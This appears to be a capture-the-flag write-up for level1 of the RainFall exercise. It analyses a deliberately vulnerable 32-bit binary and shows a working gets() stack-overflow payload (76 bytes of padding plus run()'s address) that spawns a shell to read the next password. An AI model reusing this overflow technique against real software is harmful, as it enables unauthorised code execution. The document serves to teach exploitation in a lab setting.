# Level1

## Basic Info
```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```
## Testing the program

```bash 
level1@RainFall:~$ ./level1 
a
level1@RainFall:~$ ./level1 
423
```

We have an executable that quits after given an argument. 

## Analysing the program

```bash 
info functions
All defined functions:
Non-debugging symbols:
[...]
0x08048444  run
0x08048480  main
[...]
```

There are two functions main and run. 

### Main
```bash 
disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

We allocate 0x50 (80 in decimal) bytes on the stack with 'sub'. 
Then 'lea' and 'mov', calculate the address of the variable located at esp + 0x10 and puts that address as argument for the 'gets()' call. 

### Run
```bash
Address	        Instruction	            Explanation
0x08048444	    push %ebp	            Save base pointer
0x08048445	    mov %esp, %ebp	        Set up new stack frame
0x08048447	    sub $0x18, %esp	        Reserve 24 bytes on the stack
0x0804844a	    mov 0x80497c0, %eax	    Load a global variable (possibly stdout or a string)
0x0804844f	    mov %eax, %edx	        Copy it into EDX
0x08048451	    mov $0x8048570, %eax	Load address of a string to print (format string?)
0x08048456–0x0804846a	                Prepare arguments for fwrite()
```

The run() function :
Displays a message with fwrite()
Executes a system command /bin/sh but it is never called in main


## Getting access to the shell 

We are going to overflow the main, so that the return address is the address of the run which will call /bin/sh giving us access to a terminal where we will be able to call cat on the .passwd file. 


```bash 
set args < <(python -c 'print "A" * 80')
(gdb) run
Starting program: /home/user/level1/level1 < <(python -c 'print "A" * 80')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

info registers
esp            0xbffff740	0xbffff740
ebp            0x41414141	0x41414141
[...]
eip            0x41414141	0x41414141
[...]
```

EIP is overwritten, good. Let's remove 4 bytes to check if EIP start at 76. 

```bash 
set args < <(python -c 'print "A" * 76')

Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
```

The last 4 bytes of the payload will be the address of the function "run" for calling it instead of EIP

The address of the "run" function is "0x08048444" has seen above, that we will convert to little endian

```bash
$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
$ 
```

We have access let's [script it](./Ressources/exploit.py)! 
